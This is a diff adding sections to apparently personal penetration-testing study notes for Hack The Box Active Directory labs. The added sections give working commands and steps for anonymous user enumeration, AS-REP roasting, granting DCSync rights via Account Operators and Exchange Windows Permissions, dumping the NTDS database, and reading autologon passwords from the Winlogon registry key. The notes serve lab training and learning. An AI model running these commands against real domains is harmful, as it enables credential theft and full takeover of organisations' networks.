@@ -707,3 +707,36 @@ Full reference: [[22. Active Directory Introduction and Enumeration|AD.13]]
 ---
 
 #### Tags: #ActiveDirectory #ADEnum #ADAttacks #BloodHound #PowerView #Kerberoasting #ASREPRoasting #DCSync #GoldenTicket #PtH #PtT #PtC #ACLAbuse #DomainTrust #ExtraSids #NoPac #HTBSupplementary #Methodology #comsvcs #MiniDump #pypykatz #LSASS #NTLMRelay #Defender #Module27
+
+## Forest pattern: anonymous enumeration to DCSync
+
+Run anonymous RPC and LDAP enumeration separately because their account lists can differ. If either list exposes an account with `UF_DONT_REQUIRE_PREAUTH`, request an AS-REP ticket and crack it offline. Check the output file even when GetNPUsers prints no success line.
+
+When the foothold is a member of Account Operators, create a controlled domain user and add it to `Exchange Windows Permissions` if that group exists. Authenticate as the refreshed user, grant DCSync rights with bloodyAD, and use NetExec's `--ntds` fallback if secretsdump fails with `ERROR_DS_DRA_BAD_DN`.
+
+```bash
+rpcclient -U '' -N $BoxIP -c 'enumdomusers'
+ldapsearch -x -H ldap://$BoxIP -b "DC=htb,DC=local" '(&(objectCategory=person)(objectClass=user))' sAMAccountName
+impacket-GetNPUsers $Domain/ -dc-ip $BoxIP -usersfile $Userlist -no-pass -request -format hashcat -outputfile $LootDir/asrep.txt
+bloodyAD -d $Domain -u $Username2 -p $Password2 -H $BoxIP -i $BoxIP add dcsync $Username2
+netexec smb $BoxIP -u $Username2 -p $Password2 -d $Domain --ntds
+```
+
+## HTTP username fallback
+
+When anonymous AD enumeration returns no useful users, check the target website for employee names. Convert names to likely username formats and test them with the relevant Kerberos or LDAP checks.
+
+## Winlogon after a weak foothold
+
+When a foothold has no useful groups or enabled token privileges, inspect Winlogon and Windows Credential Manager. Validate any recovered account before using it for directory attacks.
+
+```powershell
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword
+```
+
+## External Resources
+
+- [HackTricks - AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproasting)
+- [HackTricks - DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
+- [Impacket GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)
+- [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
